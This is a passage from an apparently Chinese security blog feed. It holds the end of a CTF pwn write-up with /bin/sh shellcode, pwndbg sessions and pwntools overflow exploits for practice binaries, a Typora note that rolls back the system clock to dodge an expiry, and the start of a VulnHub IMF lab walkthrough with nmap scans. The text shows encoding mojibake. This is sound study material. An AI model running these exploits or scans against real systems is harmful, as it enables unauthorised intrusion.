class="hljs-number">0x6e</span>]<br>  <span class="hljs-number">0xfff0a9a8</span>    <span class="hljs-keyword">das</span>    <br><br><br><br>  <span class="hljs-number">0x80484b6</span>  &lt;vulnerable_function+<span class="hljs-number">59</span>&gt;    <span class="hljs-keyword">ret</span>    <br>   â†“<br>â–º <span class="hljs-number">0xff8f0900</span>                             <span class="hljs-keyword">push</span>   <span class="hljs-number">0x68</span><br>  <span class="hljs-number">0xff8f0902</span>                             <span class="hljs-keyword">push</span>   <span class="hljs-number">0x732f2f2f</span><br>  <span class="hljs-number">0xff8f0907</span>                             <span class="hljs-keyword">push</span>   <span class="hljs-number">0x6e69622f</span><br>  <span class="hljs-number">0xff8f090c</span>                             <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">esp</span><br>  <span class="hljs-number">0xff8f090e</span>                             <span class="hljs-keyword">push</span>   <span class="hljs-number">0x1010101</span><br>  <span class="hljs-number">0xff8f0913</span>                             <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>], <span class="hljs-number">0x1016972</span><br>  <span class="hljs-number">0xff8f091a</span>                             <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ecx</span><br>  <span class="hljs-number">0xff8f091c</span>                             <span class="hljs-keyword">push</span>   <span class="hljs-built_in">ecx</span><br>  <span class="hljs-number">0xff8f091d</span>                             <span class="hljs-keyword">push</span>   <span class="hljs-number">4</span><br>  <span class="hljs-number">0xff8f091f</span>                             <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">ecx</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00000060</span>  <span class="hljs-number">6</span>a <span class="hljs-number">68</span> <span class="hljs-number">68</span> <span class="hljs-number">2</span>f  <span class="hljs-number">2</span>f <span class="hljs-number">2</span>f <span class="hljs-number">73</span> <span class="hljs-number">68</span>  <span class="hljs-number">2</span>f <span class="hljs-number">62</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e  <span class="hljs-number">89</span> e<span class="hljs-number">3</span> <span class="hljs-number">68</span> <span class="hljs-number">01</span>  â”‚jhh/â”‚//shâ”‚/binâ”‚Â·Â·hÂ·â”‚<br><span class="hljs-attribute">00000070</span>  <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">81</span>  <span class="hljs-number">34</span> <span class="hljs-number">24</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span>  <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">31</span> c<span class="hljs-number">9</span>  <span class="hljs-number">51</span> <span class="hljs-number">6</span>a <span class="hljs-number">04</span> <span class="hljs-number">59</span>  â”‚Â·Â·Â·Â·â”‚<span class="hljs-number">4</span>$riâ”‚Â·Â·<span class="hljs-number">1</span>Â·â”‚QjÂ·Yâ”‚<br><span class="hljs-attribute">00000080</span>  <span class="hljs-number">01</span> e<span class="hljs-number">1</span> <span class="hljs-number">51</span> <span class="hljs-number">89</span>  e<span class="hljs-number">1</span> <span class="hljs-number">31</span> d<span class="hljs-number">2</span> <span class="hljs-number">6</span>a  <span class="hljs-number">0</span>b <span class="hljs-number">58</span> cd <span class="hljs-number">80</span>  b<span class="hljs-number">0</span> <span class="hljs-number">47</span> c<span class="hljs-number">7</span> ff <br><br><br><span class="hljs-attribute">00000000</span>  <span class="hljs-number">6</span>a <span class="hljs-number">68</span> <span class="hljs-number">68</span> <span class="hljs-number">2</span>f  <span class="hljs-number">2</span>f <span class="hljs-number">2</span>f <span class="hljs-number">73</span> <span class="hljs-number">68</span>  <span class="hljs-number">2</span>f <span class="hljs-number">62</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e  <span class="hljs-number">89</span> e<span class="hljs-number">3</span> <span class="hljs-number">68</span> <span class="hljs-number">01</span>  â”‚jhh/â”‚//shâ”‚/binâ”‚Â·Â·hÂ·â”‚<br><span class="hljs-attribute">00000010</span>  <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">81</span>  <span class="hljs-number">34</span> <span class="hljs-number">24</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span>  <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">31</span> c<span class="hljs-number">9</span>  <span class="hljs-number">51</span> <span class="hljs-number">6</span>a <span class="hljs-number">04</span> <span class="hljs-number">59</span>  â”‚Â·Â·Â·Â·â”‚<span class="hljs-number">4</span>$riâ”‚Â·Â·<span class="hljs-number">1</span>Â·â”‚QjÂ·Yâ”‚<br><span class="hljs-attribute">00000020</span>  <span class="hljs-number">01</span> e<span class="hljs-number">1</span> <span class="hljs-number">51</span> <span class="hljs-number">89</span>  e<span class="hljs-number">1</span> <span class="hljs-number">31</span> d<span class="hljs-number">2</span> <span class="hljs-number">6</span>a  <span class="hljs-number">0</span>b <span class="hljs-number">58</span> cd <span class="hljs-number">80</span>  <span class="hljs-number">90</span> <span class="hljs-number">90</span> <span class="hljs-number">90</span> <span class="hljs-number">90</span>  â”‚Â·Â·QÂ·â”‚Â·<span class="hljs-number">1</span>Â·jâ”‚Â·XÂ·Â·â”‚Â·Â·Â·Â·â”‚<br></code></pre></td></tr></table></figure><h2 id="level2-x64"><a href="#level2-x64" class="headerlink" title="level2_x64"></a>level2_x64</h2><p>level2 gdb æ— æ³•æ­£å¸¸è°ƒè¯• ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> b *0x400619<span class="hljs-comment"># æ— æ³•åŠ æ–­ç‚¹run</span></span><br>Starting program: /home/pwn/æ¡Œé¢/é¢˜ç›®/ç»ƒä¹ é¢˜/pwn2_x64/level2_x64 <br>[Attaching after process 4686 vfork to child process 4690]<br>[New inferior 2 (process 4690)]<br>[Detaching vfork parent process 4686 after child exec]<br>[Inferior 1 (process 4686) detached]<br>process 4690 is executing new program: /usr/bin/dash<br>Warning:<br>Cannot insert breakpoint 1.<br>Cannot access memory at address 0x400619<br><span class="hljs-meta"></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> b main<span class="hljs-comment"># è¿è¡Œè‡³ call   system@plt &lt;system@plt&gt; å‡ºé”™</span></span><br>[Attaching after process 4764 vfork to child process 4769]<br>[New inferior 2 (process 4769)]<br>[Detaching vfork parent process 4764 after child exec]<br>[Inferior 1 (process 4764) detached]<br>process 4769 is executing new program: /usr/bin/dash<br>Error in re-setting breakpoint 1: Function &quot;main&quot; not defined.<br>Input:<br>[Inferior 2 (process 4769) exited normally]<br></code></pre></td></tr></table></figure><p>_system åœ°å€ä¸å¯è¡Œ ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./level2_x64&quot;</span>)<br>io.recvline()<br><br><span class="hljs-comment">#system_addr=0x00000000004004c0# _system</span><br>system_addr=<span class="hljs-number">0x000000000040063E</span><span class="hljs-comment"># call    _system</span><br>poprdi_drt=<span class="hljs-number">0x00000000004006b3</span><br>binsh_addr=<span class="hljs-number">0x0000000000600A90</span><br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">8</span>+p64(poprdi_drt)+p64(binsh_addr)+p64(system_addr)<br><br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="smashes"><a href="#smashes" class="headerlink" title="smashes"></a>smashes</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> search CTF</span><br>smashes         0x400d21 push   r12 /* &quot;CTF&#123;Here&#x27;s the flag on server&#125;&quot; */<br>smashes         0x600d21 &quot;CTF&#123;Here&#x27;s the flag on server&#125;&quot;<br>warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd4d02, halting search.<br>[stack]         0x7fffffffe3fe &#x27;CTF:@/tmp/.ICE-unix/1217,unix/CTF:/tmp/.ICE-unix/1217&#x27;<br>[stack]         0x7fffffffe41c &#x27;CTF:/tmp/.ICE-unix/1217&#x27;<br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> search samshes</span><br>warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd4d06, halting search.<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> stack</span><br>00:0000â”‚ rsp  0x7fffffffdf78 â€”â–¸ 0x7ffff7a2d840 (__libc_start_main+240) â—‚â€” mov    edi, eax<br>01:0008â”‚      0x7fffffffdf80 â—‚â€” 0x1<br>02:0010â”‚      0x7fffffffdf88 â€”â–¸ 0x7fffffffe058 â€”â–¸ 0x7fffffffe38d â—‚â€” 0x77702f656d6f682f (&#x27;/home/pw&#x27;)<br>03:0018â”‚      0x7fffffffdf90 â—‚â€” 0x1f7ffcca0<br>04:0020â”‚      0x7fffffffdf98 â€”â–¸ 0x4006d0 â—‚â€” sub    rsp, 8<br>05:0028â”‚      0x7fffffffdfa0 â—‚â€” 0x0<br>06:0030â”‚      0x7fffffffdfa8 â—‚â€” 0x46bc826743e3b977<br>07:0038â”‚      0x7fffffffdfb0 â€”â–¸ 0x4006ee â—‚â€” xor    ebp, ebp<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> x/2s 0x7fffffffe38d</span><br>0x7fffffffe38d:&quot;/home/pwn/æ¡Œé¢/é¢˜ç›®/ç»ƒä¹ é¢˜/smashes/smashes&quot;<br>0x7fffffffe3bf:&quot;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> stack 70</span><br>00:0000â”‚ rax rsp  0x7fffffffde40 â—‚â€” &#x27;AAAAAAAA&#x27;<br>01:0008â”‚ rdi      0x7fffffffde48 â—‚â€” 0x0<br>... â†“<br>04:0020â”‚          0x7fffffffde60 â€”â–¸ 0x7ffff7ffea88 â€”â–¸ 0x7ffff7ffe9b8 â€”â–¸ 0x7ffff7ffe728 â€”â–¸ 0x7ffff7ffe700 â—‚â€” ...<br>05:0028â”‚          0x7fffffffde68 â€”â–¸ 0x7fffffffdea0 â€”â–¸ 0x7ffff7ffb2a8 â—‚â€” add    byte ptr [rax], al /* &#x27;J&#x27; */<br>06:0030â”‚          0x7fffffffde70 â—‚â€” 0x340<br>07:0038â”‚          0x7fffffffde78 â€”â–¸ 0x7fffffffde90 â—‚â€” 0xffffffff<br>08:0040â”‚          0x7fffffffde80 â—‚â€” 0x6562b026<br>09:0048â”‚          0x7fffffffde88 â€”â–¸ 0x7ffff7b99727 â—‚â€” pop    rdi /* &#x27;__vdso_getcpu&#x27; */<br>0a:0050â”‚          0x7fffffffde90 â—‚â€” 0xffffffff<br>0b:0058â”‚          0x7fffffffde98 â€”â–¸ 0x7ffff7ffe718 â€”â–¸ 0x7ffff7ff7000 â€”â–¸ 0x7ffff7a0d000 â—‚â€” jg     0x7ffff7a0d047<br>0c:0060â”‚          0x7fffffffdea0 â€”â–¸ 0x7ffff7ffb2a8 â—‚â€” add    byte ptr [rax], al /* &#x27;J&#x27; */<br>0d:0068â”‚          0x7fffffffdea8 â€”â–¸ 0x7ffff7ffe700 â€”â–¸ 0x7ffff7ffb000 â—‚â€” jg     0x7ffff7ffb047<br>0e:0070â”‚          0x7fffffffdeb0 â€”â–¸ 0x7fffffffde01 â—‚â€” 0x7fffffffe0<br>0f:0078â”‚          0x7fffffffdeb8 â—‚â€” 0x2ca4b2531b62<br>10:0080â”‚          0x7fffffffdec0 â—‚â€” 0x2<br>11:0088â”‚          0x7fffffffdec8 â—‚â€” 0x8000000000000006<br>12:0090â”‚          0x7fffffffded0 â—‚â€” 0x0<br>... â†“<br>18:00c0â”‚          0x7fffffffdf00 â—‚â€” 0x1<br>19:00c8â”‚          0x7fffffffdf08 â€”â–¸ 0x7fffffffe068 â€”â–¸ 0x7fffffffe3bf â—‚â€” &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;<br>1a:00d0â”‚          0x7fffffffdf10 â€”â–¸ 0x7ffff7dd2620 (_IO_2_1_stdout_) â—‚â€” 0xfbad2887<br>1b:00d8â”‚          0x7fffffffdf18 â€”â–¸ 0x7ffff7a88957 (_IO_default_setbuf+23) â—‚â€” cmp    eax, -1<br>1c:00e0â”‚          0x7fffffffdf20 â€”â–¸ 0x7ffff7dd2620 (_IO_2_1_stdout_) â—‚â€” 0xfbad2887<br>1d:00e8â”‚          0x7fffffffdf28 â—‚â€” 0x0<br>... â†“<br>1f:00f8â”‚          0x7fffffffdf38 â€”â–¸ 0x7ffff7a85449 (_IO_file_setbuf+9) â—‚â€” test   rax, rax<br>20:0100â”‚          0x7fffffffdf40 â€”â–¸ 0x7ffff7dd2620 (_IO_2_1_stdout_) â—‚â€” 0xfbad2887<br>21:0108â”‚          0x7fffffffdf48 â—‚â€” 0x1e01344de41fba00<br>22:0110â”‚          0x7fffffffdf50 â—‚â€” 0x0<br>... â†“<br>24:0120â”‚          0x7fffffffdf60 â€”â–¸ 0x4008b0 â—‚â€” push   r15<br>25:0128â”‚          0x7fffffffdf68 â€”â–¸ 0x4006e7 â—‚â€” xor    eax, eax<br>26:0130â”‚          0x7fffffffdf70 â—‚â€” 0x0<br>27:0138â”‚          0x7fffffffdf78 â€”â–¸ 0x7ffff7a2d840 (__libc_start_main+240) â—‚â€” mov    edi, eax<br>28:0140â”‚          0x7fffffffdf80 â—‚â€” 0x1<br>29:0148â”‚          0x7fffffffdf88 â€”â–¸ 0x7fffffffe058 â€”â–¸ 0x7fffffffe38d â—‚â€” 0x77702f656d6f682f (&#x27;/home/pw&#x27;)<br>2a:0150â”‚          0x7fffffffdf90 â—‚â€” 0x1f7ffcca0<br>2b:0158â”‚          0x7fffffffdf98 â€”â–¸ 0x4006d0 â—‚â€” sub    rsp, 8<br>2c:0160â”‚          0x7fffffffdfa0 â—‚â€” 0x0<br>2d:0168â”‚          0x7fffffffdfa8 â—‚â€” 0x46bc826743e3b977<br>2e:0170â”‚          0x7fffffffdfb0 â€”â–¸ 0x4006ee â—‚â€” xor    ebp, ebp<br>2f:0178â”‚          0x7fffffffdfb8 â€”â–¸ 0x7fffffffe050 â—‚â€” 0x1<br>30:0180â”‚          0x7fffffffdfc0 â—‚â€” 0x0<br>... â†“<br>32:0190â”‚          0x7fffffffdfd0 â—‚â€” 0xb9437d18ed83b977<br>33:0198â”‚          0x7fffffffdfd8 â—‚â€” 0xb9436da2fd73b977<br>34:01a0â”‚          0x7fffffffdfe0 â—‚â€” 0x0<br>... â†“<br>37:01b8â”‚          0x7fffffffdff8 â€”â–¸ 0x7fffffffe068 â€”â–¸ 0x7fffffffe3bf â—‚â€” &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;<br>38:01c0â”‚          0x7fffffffe000 â€”â–¸ 0x7ffff7ffe168 â—‚â€” 0x0<br>39:01c8â”‚          0x7fffffffe008 â€”â–¸ 0x7ffff7de780b (_dl_init+139) â—‚â€” jmp    0x7ffff7de77e0<br>3a:01d0â”‚          0x7fffffffe010 â—‚â€” 0x0<br>... â†“<br>3c:01e0â”‚          0x7fffffffe020 â€”â–¸ 0x4006ee â—‚â€” xor    ebp, ebp<br>3d:01e8â”‚          0x7fffffffe028 â€”â–¸ 0x7fffffffe050 â—‚â€” 0x1<br>3e:01f0â”‚          0x7fffffffe030 â—‚â€” 0x0<br>3f:01f8â”‚          0x7fffffffe038 â€”â–¸ 0x400717 â—‚â€” hlt    <br>40:0200â”‚          0x7fffffffe040 â€”â–¸ 0x7fffffffe048 â—‚â€” 0x1c<br>41:0208â”‚          0x7fffffffe048 â—‚â€” 0x1c<br>42:0210â”‚ r13      0x7fffffffe050 â—‚â€” 0x1<br>43:0218â”‚          0x7fffffffe058 â€”â–¸ 0x7fffffffe38d â—‚â€” 0x77702f656d6f682f (&#x27;/home/pw&#x27;)<br>44:0220â”‚          0x7fffffffe060 â—‚â€” 0x0<br>45:0228â”‚          0x7fffffffe068 â€”â–¸ 0x7fffffffe3bf â—‚â€” &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> distance <span class="hljs-variable">$rsp</span> 0x7fffffffe058</span><br><span class="hljs-meta">0x7fffffffde40-&gt;</span><span class="bash">0x7fffffffe058 is 0x218 bytes (0x43 words)</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=process(<span class="hljs-string">&quot;./smashes&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>);<br><br>flag_addr=<span class="hljs-number">0x400d20</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x218</span>+p64(flag_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="echo2"><a href="#echo2" class="headerlink" title="echo2"></a>echo2</h2><p><a href="http://www.chiange.com/test/">[pwnable.kr] echo2 (Rewritten with .md) â€“ Chiang Eâ€™s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Typoraå¼€å‘ç‰ˆæ— æ³•ä½¿ç”¨è§£å†³æ–¹æ³•</title>
    <link href="/2022/05/06/MessUp/Typora%E5%BC%80%E5%8F%91%E7%89%88%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <url>/2022/05/06/MessUp/Typora%E5%BC%80%E5%8F%91%E7%89%88%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<blockquote><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.cnblogs.com/coming1890/p/16034861.html">https://www.cnblogs.com/coming1890/p/16034861.html</a></p></blockquote><p>æˆ‘çš„Typoraç‰ˆæœ¬0.11ï¼Œä»Šå¤©æ‰“å¼€å‘ç°ç«Ÿç„¶æ— æ³•ä½¿ç”¨ï¼Œç›´æ¥æŠ¥é”™å¦‚ä¸‹ï¼š</p><p><img src="https://img2022.cnblogs.com/blog/2124886/202203/2124886-20220321150804624-1277341931.png" alt="img"></p><p>äºæ˜¯æˆ‘æ›´æ”¹ç³»ç»Ÿæ—¶é—´å°†æ—¶é—´è°ƒæ•´åˆ° 2020å¹´01æœˆ01æ—¥ï¼Œå°±å¯ä»¥æ­£å¸¸æ‰“å¼€äº†ï¼›å¯æ˜¯å½“æˆ‘ä½¿ç”¨ Chrome æµè§ˆå™¨ä¸Šç½‘æ—¶ï¼Œå±…ç„¶åˆæç¤ºæˆ‘çš„æ—¶é’Ÿæ…¢äº†ï¼Œäºæ˜¯æˆ‘åªèƒ½åˆå°†æ—¶é—´åŒæ­¥ï¼Œå†çœ‹ typora è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼ˆä¿é™©èµ·è§å¯ä»¥ç¦æ­¢ Typora.exe æ–‡ä»¶è”ç½‘ï¼‰</p><p>äºæ˜¯ï¼Œæˆ‘ä¸ºäº†æ­£å¸¸ä½¿ç”¨ typoraï¼Œåªèƒ½å…ˆå°†æ—¶é—´è°ƒå‰ï¼Œç„¶åæ‰“å¼€ç¨‹åºï¼Œç„¶åå†åŒæ­¥æ—¶é—´ï¼Œæˆ‘è§‰å¾—å¤ªéº»çƒ¦äº†ï¼Œæ‰€ä»¥å†™ä¸‹äº†å¦‚ä¸‹ cmd è„šæœ¬æ¥å®Œæˆè¿™äº›æ“ä½œ</p><p><strong>main.cmdï¼š</strong></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">set</span> datevar=<span class="hljs-variable">%date:~0,4%</span>/<span class="hljs-variable">%date:~5,2%</span>/<span class="hljs-variable">%date:~8,2%</span><br><span class="hljs-built_in">cmd</span> /c <span class="hljs-variable">%USERPROFILE%</span>\Documents\Share\lauch_typora.<span class="hljs-built_in">cmd</span><br>python -c &quot;from <span class="hljs-built_in">time</span> import sleep; sleep(<span class="hljs-number">4</span>)&quot;<br><span class="hljs-built_in">date</span> <span class="hljs-variable">%datevar%</span><br></code></pre></td></tr></table></figure><p><strong>lauch_typora.cmdï¼š</strong></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">date</span> <span class="hljs-number">2020</span>/<span class="hljs-number">01</span>/<span class="hljs-number">01</span><br><span class="hljs-built_in">Start</span> <span class="hljs-variable">%SystemDrive%</span>\Exec\Typora\Typora.exe<br></code></pre></td></tr></table></figure><p>ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œ main.cmd å³å¯</p><p>æ³¨æ„ï¼šå°† lauch_typora.cmd ä¸ Typora.exe çš„è·¯å¾„æ¢æˆè‡ªå·±çš„</p>]]></content>
    
    
    <categories>
      
      <category>Typora</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Typora</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IMFï¼š1</title>
    <link href="/2022/05/02/Penetration/Vulnhub/Part-1/0x03%20IMF/"/>
    <url>/2022/05/02/Penetration/Vulnhub/Part-1/0x03%20IMF/</url>
    
    <content type="html"><![CDATA[<h1 id="0x03-IMF-1-vulnhub"><a href="#0x03-IMF-1-vulnhub" class="headerlink" title="0x03 IMF: 1~vulnhub"></a>0x03 IMF: 1~vulnhub</h1><blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/imf-1,162/">IMF: 1 ~ VulnHub</a></p><p>ç¯å¢ƒä¿¡æ¯ï¼š</p><ul><li>æ”»å‡»æœº IPï¼š192.168.135.141</li><li>é¶æœº IPï¼š192.168.135.146</li></ul></blockquote><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€ä¸»æœºæ¢æµ‹"><a href="#1ã€ä¸»æœºæ¢æµ‹" class="headerlink" title="1ã€ä¸»æœºæ¢æµ‹"></a>1ã€ä¸»æœºæ¢æµ‹</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24    <span class="hljs-comment"># æ‰«æè¯¥ç½‘æ®µä¸Šæ´»è·ƒçš„ä¸»æœº</span></span><br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°é¶æœº ipï¼š192.168.135.146</strong></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sS -A -p- 192.168.135.146     <span class="hljs-comment"># å…¨ç«¯å£æ‰«æ</span></span><br></code></pre></td></tr></table></figure><p><strong>ç®€å•çš„ç«¯å£æ‰«æï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -p- 192.168.135.146</span><br></code></pre></td></tr></table></figure><p><strong>å…¨é¢æ‰«æï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -A -p- 192.168.135.146</span><br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°ç›®æ ‡ç«¯å£ä¿¡æ¯</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th></tr></thead><tbody><tr><td>80/tcp</td><td>open</td><td>http</td></tr></tbody></table></div><h2 id="äºŒã€æƒé™è·å–"><a href="#äºŒã€æƒé™è·å–" class="headerlink" title="äºŒã€æƒé™è·å–"></a>äºŒã€æƒé™è·å–</h2><p>åœ¨å‰æœŸçš„ä¿¡æ¯æœé›†åå¾—çŸ¥ï¼Œè¿™æ˜¯ä¸€ä¸ªçº¯è™šæ‹Ÿé¶åœºã€‚</p><p>è®¿é—® <code>192.168.135.146:80</code> ï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆï¼ŒæŸ¥çœ‹æºç ï¼Œå¾—åˆ°ä¸€ä¸ªæç¤ºï¼Œè¿›è¡Œè§£å¯†ï¼š</p> <!-- flag1{YWxsdGhlZmlsZXM=} --> ===> allthefilesæŸ¥çœ‹æ–‡ä»¶ï¼Œå‘ç°ä¸‰ä¸ªå¥‡æ€ªçš„æ–‡ä»¶åï¼š<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- Js 